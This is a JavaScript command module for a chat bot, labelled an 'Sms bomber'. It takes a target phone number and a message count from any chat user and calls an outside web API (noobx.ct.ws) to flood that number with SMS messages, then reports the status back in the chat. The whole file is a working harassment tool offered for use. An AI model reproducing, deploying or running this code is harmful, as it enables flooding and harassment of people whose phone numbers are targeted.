const axios = require("axios");

module.exports = {
  config: {
    name: "sms",
    aliases: ["smsbomber", "bomber"],
    version: "2.0",
    author: "Sakib",
    countDown: 5,
    role: 0,
    shortDescription: {
      en: "Sms bomber"
    },
    category: "utility",
    guide: {
      en: "{pn} <number> <limit>"
    }
  },

  onStart: async function ({ api, event, args }) {
    try {
      const number = args[0];
      const limit = args[1] || 1;

      if (!number) {
        return api.sendMessage(
          "❌ | Please provide a number.\n\nUsage:\n!sms <number> <limit>",
          event.threadID,
          event.messageID
        );
      }
const hiddenNumber = number.length > 8 ? number.slice(0,3) + "******" + number.slice(-2) : number;
      api.sendMessage(`
      ⏳ | SMS bomber started for number ${hiddenNumber} with limit ${limit}...
      `)
      const url = `https://www.noobx.ct.ws/api/sms-boomber?number=${number}&limit=${limit}`;

      const response = await axios.get(url);
      const data = response.data;

      if (!data || data.status !== "success") {
        return api.sendMessage(
          "❌ | Failed to fetch data from API.",
          event.threadID,
          event.messageID
        );
      }

      const message = `
✅ | Status: ${data.status}
📩 | Response: ${data.response}
      `;

      return api.sendMessage(message, event.threadID, event.messageID);

    } catch (error) {
      console.error(error);
      return api.sendMessage(
        "❌ | An error occurred while fetching the API.",
        event.threadID,
        event.messageID
      );
    }
  }
};